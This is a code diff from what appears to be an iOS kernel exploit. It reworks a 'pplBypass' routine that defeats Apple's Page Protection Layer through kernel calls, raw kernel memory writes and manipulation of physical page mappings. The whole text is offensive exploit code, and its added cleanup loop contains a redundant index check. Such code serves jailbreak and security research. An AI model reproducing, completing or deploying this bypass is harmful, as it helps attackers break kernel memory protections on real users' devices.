@@ -25,6 +25,8 @@ volatile uint64_t gBypassDone  = 0;
 uint64_t gMagicPPLMap   = 0;
 uint64_t *gMagicPPLPage = NULL;
 
+extern uint64_t getPageForPPL(void);
+
 uint64_t pmap_lv1(uint64_t pmap, uint64_t virt) {
     uint64_t ttep = pcidev_r64(pmap + 0x8ULL);
     
@@ -71,8 +73,13 @@ uint64_t pmapFirstFree(uint64_t pmap, uint64_t start) {
 #define CREATE_PMAP() kcall(pmap_create_options, 0 /* ledger */, 0 /* size */, 0x1 /* flags */, 0, 0, 0, 0, 0)
 
 bool pplBypass(void) {
-    uint64_t page = kmemAlloc(0x8000, true); // Must leak this memory, PPL will own the page
-    pcidev_w64(page, 0x41424344DEADBEEFULL);
+    uint64_t pagePhys  = getPageForPPL();
+    guard (pagePhys != 0) else {
+        puts("[-] pplBypass: Failed to alloc PPL page!");
+        return false;
+    }
+    
+    DBGPRINT_ADDRVAR(pagePhys);
     
     uint64_t pmap_create_options = SLIDE(gOffsets.pmap_create_options);
     
@@ -150,21 +157,6 @@ bool pplBypass(void) {
     
     puts("[+] pplBypass: Nest succeded!");
     
-    // Get physical addresses
-    uint64_t pagePhys = translateAddr(page);
-    uint64_t pagePhys2 = translateAddr(page + 0x4000);
-    
-    // Map pagePhys2 to pagePhys
-    // This will free pagePhys
-    kr = pmap_enter_options_addr(gKernelPmap, pagePhys2, page);
-    guard (kr == KERN_SUCCESS) else {
-        printf("[-] pplBypass: Failed to get physical page! [%p]\n", (void*)(uint64_t) kr);
-        return false;
-    }
-    
-    // We can now freely use pagePhys
-    DBGPRINT_ADDRVAR(pagePhys);
-    
     // Map this page into our exploit pmap
     // Should also be visible for us
     kr = pmap_enter_options_addr(exploitPmap, pagePhys, firstFree);
@@ -172,10 +164,6 @@ bool pplBypass(void) {
         printf("[-] pplBypass: Failed to map pagePhys! [%p]\n", (void*)(uint64_t) kr);
         return false;
     }
-    
-    // Set fault handler
-    //void (*setFaultHandler)(uint64_t faultHandler) = (void(*)(uint64_t)) DBG_SET_FAULT_HNDLR;
-    //setFaultHandler((uint64_t) ptrauth_strip(ppl_done, ptrauth_key_function_pointer));
     
     // Create target page
     uint64_t page_R_va   = 0x318000000;
@@ -240,6 +228,16 @@ bool pplBypass(void) {
     return true;
 }
 
+void pplBypassDeinit(void) {
+    for (int i = 1; i < 0x400; i++) {
+        if (i != 1024) {
+            gMagicPPLPage[i] = 0;
+        }
+    }
+    
+    gMagicPPLPage[1024] = 0;
+}
+
 void* getPhysMapWindow(uint64_t phys) {
     phys &= 0xFFFFFFFFC000ULL;
     
@@ -250,7 +248,7 @@ void* getPhysMapWindow(uint64_t phys) {
         uint64_t val = gMagicPPLPage[i] & 0xFFFFFFFFC000ULL;
         if (val == phys) {
             return (void*) (gMagicPPLMap + (i << 14ULL));
-        } else if (entry == NULL && val == 0) {
+        } else if (entry == NULL && gMagicPPLPage[i] == 0) {
             entry   = &gMagicPPLPage[i];
             entryVA = (void*) (gMagicPPLMap + (i << 14ULL));
         }
